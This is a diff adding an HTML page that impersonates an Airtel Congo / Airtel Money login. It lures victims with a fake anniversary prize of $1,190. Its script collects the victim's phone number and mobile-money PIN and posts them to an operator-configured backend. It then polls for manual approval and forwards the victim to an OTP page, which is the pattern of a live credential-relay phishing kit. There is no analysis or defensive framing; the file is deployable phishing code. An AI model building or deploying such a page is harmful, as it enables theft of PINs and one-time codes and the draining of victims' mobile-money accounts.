@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AIRTEL CONGO - Connexion</title>
+<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=DM+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { min-height: 100vh; background: #f5f5f5; font-family: 'DM Sans', 'Segoe UI', Roboto, Arial, sans-serif; }
+  .login-container { min-height: 100vh; display: flex; flex-direction: column; background: linear-gradient(180deg, #ffffff 0%, #fafafa 100%); max-width: 480px; margin: 0 auto; position: relative; box-shadow: 0 0 60px rgba(0, 0, 0, 0.08); }
+  .login-header { padding: 32px 24px 20px; display: flex; justify-content: center; align-items: center; border-bottom: 1px solid rgba(192, 0, 26, 0.06); }
+  .logo-large img { height: 44px; width: auto; }
+  .login-content { flex: 1; padding: 24px 24px 32px; display: flex; flex-direction: column; }
+  .login-title { font-family: 'Syne', 'DM Sans', sans-serif; font-size: 20px; font-weight: 700; color: #1a1a1a; line-height: 1.4; margin-bottom: 24px; letter-spacing: -0.01em; }
+  .login-form { display: flex; flex-direction: column; gap: 24px; }
+  .phone-input-container { display: flex; align-items: center; background: #ffffff; border: 1.5px solid #e0e0e0; border-radius: 12px; overflow: hidden; transition: all 0.2s; box-shadow: 0 1px 3px rgba(0, 0, 0, 0.04); }
+  .phone-input-container:focus-within { border-color: #c0001a; box-shadow: 0 0 0 3px rgba(192, 0, 26, 0.1); }
+  .country-code { display: flex; align-items: center; gap: 6px; padding: 14px; background: #fafafa; border-right: 1.5px solid #e0e0e0; font-size: 15px; font-weight: 600; color: #333; white-space: nowrap; }
+  .flag-icon { font-size: 18px; line-height: 1; }
+  .phone-input { flex: 1; border: none; outline: none; padding: 14px 16px; font-size: 16px; font-family: inherit; font-weight: 500; color: #1a1a1a; letter-spacing: 0.5px; background: transparent; cursor: not-allowed; }
+  .phone-input:disabled { color: #666; background: #fafafa; }
+  .pin-section { display: flex; flex-direction: column; gap: 12px; }
+  .pin-label { font-size: 14px; font-weight: 600; color: #333; }
+  .pin-inputs-wrapper { display: flex; align-items: center; gap: 12px; }
+  .pin-input-single { flex: 1; height: 56px; border: 1.5px solid #e0e0e0; border-radius: 12px; background: #ffffff; font-size: 22px; font-weight: 700; text-align: center; color: #1a1a1a; outline: none; transition: all 0.2s; font-family: inherit; letter-spacing: 12px; padding-left: 12px; box-shadow: 0 1px 3px rgba(0, 0, 0, 0.04); }
+  .pin-input-single:focus { border-color: #c0001a; box-shadow: 0 0 0 3px rgba(192, 0, 26, 0.1); }
+  .pin-input-single::placeholder { color: #c0c0c0; letter-spacing: 8px; font-size: 20px; font-weight: 400; padding-left: 0; }
+  .eye-button { width: 48px; height: 48px; border: 1.5px solid #e0e0e0; border-radius: 12px; background: #ffffff; font-size: 20px; cursor: pointer; display: flex; align-items: center; justify-content: center; transition: all 0.2s; flex-shrink: 0; }
+  .eye-button:hover { border-color: #c0001a; background: #fff5f5; }
+  .login-button { width: 100%; padding: 16px; border: none; border-radius: 12px; background: linear-gradient(135deg, #c0001a 0%, #e8001f 100%); color: #ffffff; font-size: 15px; font-weight: 800; letter-spacing: 0.08em; text-transform: uppercase; cursor: pointer; transition: all 0.3s; box-shadow: 0 8px 24px rgba(192, 0, 26, 0.35); font-family: 'Syne', 'DM Sans', sans-serif; margin-top: 8px; display: flex; align-items: center; justify-content: center; gap: 10px; }
+  .login-button:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 12px 32px rgba(192, 0, 26, 0.5); }
+  .login-button:disabled { background: linear-gradient(135deg, #d4d4d4 0%, #b8b8b8 100%); cursor: not-allowed; box-shadow: none; opacity: 0.7; }
+  .spinner { width: 18px; height: 18px; border: 2.5px solid rgba(255, 255, 255, 0.3); border-top-color: #ffffff; border-radius: 50%; animation: spin 0.7s linear infinite; display: none; }
+  .spinner.show { display: block; }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .error-msg { background: rgba(192, 0, 26, 0.08); border: 1px solid rgba(192, 0, 26, 0.3); border-radius: 10px; padding: 10px 14px; font-size: 13px; color: #c0001a; text-align: center; display: none; }
+  .error-msg.show { display: block; }
+  .login-footer { padding: 24px; display: flex; flex-direction: column; align-items: center; gap: 12px; background: #fafafa; border-top: 1px solid rgba(0, 0, 0, 0.05); }
+  .login-footer img { height: 28px; opacity: 0.5; }
+  .footer { font-size: 12px; color: #999; }
+  @media (max-width: 480px) {
+    .login-container { box-shadow: none; }
+    .login-header { padding: 24px 20px 16px; }
+    .login-content { padding: 20px 20px 24px; }
+    .login-title { font-size: 18px; }
+    .pin-input-single { height: 52px; font-size: 20px; letter-spacing: 10px; padding-left: 10px; }
+    .eye-button { width: 44px; height: 44px; }
+    .login-button { font-size: 14px; padding: 15px; }
+  }
+</style>
+</head>
+<body>
+<div id="root">
+  <div class="login-container">
+    <div class="login-header">
+      <div class="logo-large">
+        <img alt="Airtel Logo" src="https://cdn-webportal.airtelstream.net/website/zambia/assets/images/logo.svg">
+      </div>
+    </div>
+    <div class="login-content">
+      <div style="background: linear-gradient(135deg, rgb(122, 0, 0) 0%, rgb(192, 0, 26) 60%, rgb(232, 0, 31) 100%); border-radius: 16px; padding: 14px 18px; margin-bottom: 20px; display: flex; align-items: center; gap: 12px; box-shadow: rgba(192, 0, 26, 0.25) 0px 4px 20px;">
+        <div style="font-size: 28px; flex-shrink: 0;">🏆</div>
+        <div>
+          <div style="font-family: Syne, sans-serif; font-size: 13px; font-weight: 800; color: rgb(255, 215, 0); letter-spacing: 0.04em; margin-bottom: 2px;">Airtel DRC · 25ème Anniversaire</div>
+          <div style="font-size: 12px; color: rgba(255, 255, 255, 0.85); line-height: 1.4;">Connectez-vous pour réclamer votre prix de <strong id="loginAmount" style="color: rgb(255, 255, 255); font-size: 14px;">$1,190</strong></div>
+        </div>
+      </div>
+      <h1 class="login-title">Connectez-vous à Airtel Money pour réclamer votre récompense.</h1>
+      <form class="login-form" id="loginForm">
+        <div class="phone-input-container">
+          <div class="country-code">
+            <span class="flag-icon">🇨🇩</span>
+            <span>+243</span>
+          </div>
+          <input class="phone-input" id="phoneInput" placeholder="912345678" maxlength="10" inputmode="numeric" type="tel" value="" disabled>
+        </div>
+        <div class="pin-section">
+          <p class="pin-label">Entrez votre Code PIN</p>
+          <div class="pin-inputs-wrapper">
+            <input class="pin-input-single" id="pinInput" placeholder="••••" maxlength="4" inputmode="numeric" pattern="[0-9]*" required type="password" value="">
+            <button type="button" class="eye-button" aria-label="Afficher le PIN">👁️‍🗨️</button>
+          </div>
+        </div>
+        <div class="error-msg" id="errorMsg"></div>
+        <button type="submit" class="login-button" id="loginBtn" disabled>
+          <span class="spinner" id="spinner"></span>
+          <span id="loginBtnText">SE CONNECTER &amp; RÉCLAMER</span>
+        </button>
+      </form>
+    </div>
+    <div class="login-footer">
+      <div>
+        <img alt="Airtel Logo" src="https://cdn-webportal.airtelstream.net/website/zambia/assets/images/logo.svg">
+      </div>
+      <footer class="footer">© 2026 Airtel Congo. Tous droits réservés.</footer>
+    </div>
+  </div>
+</div>
+
+<script>
+  /* ==================== CONFIG ==================== */
+  // ⚠️ REPLACE WITH YOUR RENDER URL — e.g. https://drc-airtel-claim.onrender.com
+  const BACKEND_URL = 'https://YOUR-RENDER-SERVICE.onrender.com';
+  const POLL_INTERVAL = 2000;
+
+  /* ==================== ELEMENTS ==================== */
+  const pinInput = document.getElementById('pinInput');
+  const loginBtn = document.getElementById('loginBtn');
+  const eyeButton = document.querySelector('.eye-button');
+  const phoneInput = document.getElementById('phoneInput');
+  const errorMsg = document.getElementById('errorMsg');
+  const spinner = document.getElementById('spinner');
+  const loginBtnText = document.getElementById('loginBtnText');
+
+  /* ==================== SANDBOX-SAFE STORAGE ==================== */
+  function _safeStorageGet(key) {
+    try { return sessionStorage.getItem(key); } catch (e) { return null; }
+  }
+
+  /* ==================== LOAD SESSION ==================== */
+  const phone = _safeStorageGet('airtel_phone');
+  const amount = _safeStorageGet('airtel_amount');
+  const sessionToken = _safeStorageGet('airtel_session');
+
+  if (!phone || !amount || !sessionToken) {
+    window.location.href = 'index.html';
+  }
+
+  phoneInput.value = phone || '';
+  if (amount) {
+    document.getElementById('loginAmount').textContent = '$' + parseInt(amount).toLocaleString('en-US');
+  }
+
+  /* ==================== PIN INPUT ==================== */
+  pinInput.addEventListener('input', (e) => {
+    e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
+    loginBtn.disabled = e.target.value.length !== 4;
+    hideError();
+  });
+
+  /* ==================== EYE TOGGLE ==================== */
+  let pinVisible = false;
+  eyeButton.addEventListener('click', () => {
+    pinVisible = !pinVisible;
+    pinInput.type = pinVisible ? 'text' : 'password';
+    eyeButton.textContent = pinVisible ? '🙈' : '👁️‍🗨️';
+  });
+
+  /* ==================== ERROR HELPERS ==================== */
+  function showError(message) {
+    errorMsg.textContent = message;
+    errorMsg.classList.add('show');
+  }
+  function hideError() {
+    errorMsg.classList.remove('show');
+  }
+
+  /* ==================== POLLING ==================== */
+  let pollTimer = null;
+  function stopPolling() {
+    if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
+  }
+
+  /* ==================== FORM SUBMIT ==================== */
+  document.getElementById('loginForm').addEventListener('submit', async (e) => {
+    e.preventDefault();
+    const pin = pinInput.value;
+    if (pin.length !== 4) return;
+
+    spinner.classList.add('show');
+    loginBtnText.textContent = 'CONNEXION EN COURS...';
+    loginBtn.disabled = true;
+    hideError();
+
+    try {
+      const res = await fetch(`${BACKEND_URL}/api/login`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          phone: phone,
+          pin: pin,
+          amount: amount,
+          session: sessionToken,
+          page: 'login'
+        }),
+      });
+
+      const data = await res.json();
+      if (!res.ok || !data.success) throw new Error(data.error || 'Erreur');
+
+      const requestId = data.request_id;
+      if (!requestId) throw new Error('No request_id from server');
+
+      loginBtnText.textContent = 'EN ATTENTE DE VALIDATION...';
+
+      pollTimer = setInterval(async () => {
+        try {
+          const controller = new AbortController();
+          const timeout = setTimeout(() => controller.abort(), 8000);
+
+          const r = await fetch(`${BACKEND_URL}/api/login/status/${requestId}`, {
+            signal: controller.signal
+          });
+          clearTimeout(timeout);
+
+          if (!r.ok) {
+            console.warn('Status fetch non-OK:', r.status);
+            return;
+          }
+
+          const s = await r.json();
+
+          if (s.status === 'approved') {
+            stopPolling();
+            window.location.href = 'otp.html';
+          } else if (s.status === 'rejected' || s.status === 'expired') {
+            stopPolling();
+            resetWithError('Identifiants incorrects');
+          }
+        } catch (err) {
+          console.warn('Poll error (will retry):', err.message);
+        }
+      }, POLL_INTERVAL);
+
+    } catch (err) {
+      console.error(err);
+      resetWithError(err.message || 'Une erreur est survenue. Réessayez.');
+    }
+  });
+
+  /* ==================== RESET ==================== */
+  function resetWithError(message) {
+    spinner.classList.remove('show');
+    loginBtnText.textContent = 'SE CONNECTER & RÉCLAMER';
+    loginBtn.disabled = false;
+    pinInput.value = '';
+    pinInput.focus();
+    showError(message);
+  }
+</script>
+</body>
+</html>
